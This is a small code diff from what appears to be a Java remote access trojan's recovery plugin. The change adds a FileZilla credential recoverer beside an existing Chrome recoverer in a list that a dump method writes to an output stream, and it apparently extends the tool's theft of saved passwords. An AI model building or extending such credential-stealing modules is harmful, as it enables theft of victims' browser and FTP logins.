@@ -5,11 +5,13 @@ import java.util.List;
 
 import jrat.plugin.recovery.stub.programs.AbstractRecoverer;
 import jrat.plugin.recovery.stub.programs.Chrome;
+import jrat.plugin.recovery.stub.programs.FileZilla;
 
 public class Recovery {
 	
 	public static final AbstractRecoverer[] RECOVERERS = new AbstractRecoverer[] {
-		new Chrome()
+		new Chrome(),
+		new FileZilla()
 	};
 	
 	public static void dump(DataOutputStream dos) throws Exception {
